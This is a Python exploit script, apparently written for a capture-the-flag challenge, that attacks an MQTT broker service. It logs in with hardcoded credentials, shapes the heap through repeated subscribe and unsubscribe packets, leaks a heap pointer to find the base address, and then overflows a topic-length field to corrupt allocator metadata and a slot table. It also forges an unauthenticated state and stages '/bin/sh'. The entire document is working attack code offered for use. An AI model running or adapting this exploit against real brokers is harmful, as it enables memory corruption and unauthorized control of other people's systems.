import socket, struct, time, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
BIN2HEAP=0x220f0; TABLE=0x20338; STATE_VAR=0x20330
def vi(n):
    o=b''
    while True:
        b=n%128;n//=128
        if n:o+=bytes([b|0x80])
        else:o+=bytes([b]);break
    return o
def ss(x):
    if isinstance(x,str): x=x.encode()
    return struct.pack('>H',len(x)&0xffff)+x
def pk(t,b): return bytes([t])+vi(len(b))+b
s=socket.create_connection((HOST,PORT),8)
def rd(t=0.8):
    s.settimeout(t); out=b''
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            out+=d
    except Exception: pass
    return out
def sub(topic=None,raw=None,pl=None,t=1.0):
    body=struct.pack('>H',1)+(ss(topic) if raw is None else struct.pack('>H',raw)+pl)
    s.sendall(pk(0x82,body)); time.sleep(0.15); return rd(t)
def unsub(topic,t=1.0):
    s.sendall(pk(0xA2,struct.pack('>H',1)+ss(topic))); time.sleep(0.15); return rd(t)
def pub(topic,payload,t=1.0):
    s.sendall(pk(0x30,ss(topic)+payload)); time.sleep(0.15); return rd(t)
s.sendall(pk(0x10,ss('MQTT')+bytes([4,0xC2])+struct.pack('>H',0x4321)+ss('QWB_Client')+ss('QWB2026_Admin')+ss('hn5ne')))
time.sleep(0.6); print('auth',rd(0.8).hex())
sub('d1zz'); sub('d2zz'); sub('d3zz'); sub(b'A'*30); sub(b'B'*30); sub('QWB2026_News')
unsub(b'A'*30); unsub(b'B'*30)
for _ in range(6): s.sendall(b'\xc0\x00'); rd(0.3)
r=pub('QWB2026_News',b'C'*30)
i=r.find(b'\x34\x2e\x00\x0cQWB2026_News'); leak=None
if i>=0:
    bd=r[i+2:i+2+0x2e]; tl=struct.unpack('>H',bd[0:2])[0]; leak=struct.unpack('>Q',bd[2+tl+2:][:8])[0]
print('leak',hex(leak) if leak else None); 
if not leak: raise SystemExit(1)
BASE=leak-BIN2HEAP
CMD=b'VERIFYSLOT-0123456789abcdef'      # 26B -> nb=48 -> fastbin[4] head
print('sub cmd(pad32):', sub(CMD+b'#'*(32-len(CMD))).hex())
# fake state at top chunk (136B) with auth byte 0
st=bytearray(136); st[0]=0; st[1]=0; st[2]=1; st[3]=6
print('sub state:', sub(bytes(st)).hex())
sub('/bin/sh'); sub('d1xx'); sub('d2xx'); sub('Xx'); sub('Yy'); sub('Z'*400); unsub('Yy'); unsub('Xx')
pl=bytearray(b'A'*272); pl[24:32]=struct.pack('>Q',0x21); pl[32:40]=struct.pack('>Q',(BASE+TABLE)-16)
sub(raw=0xFFFF,pl=bytes(pl)); sub('AAAA')
slot=bytearray(272)
slot[0:8]=struct.pack('>Q',BASE+0x22130)
slot[8:10]=struct.pack('>H',32)
slot[16:24]=struct.pack('>Q',BASE+STATE_VAR)
slot[24:26]=struct.pack('>H',8)
print('ovf2:', sub(raw=0xFFFF,pl=bytes(slot)).hex())
r=pub(CMD+b'#'*(32-len(CMD)), struct.pack('>Q',BASE+0x221a0))
print('pub8(no resp expected):', r.hex())
time.sleep(0.3)
print('TEST subscribe (gated => slot injection works):', sub('afterprobe').hex())
s.close()
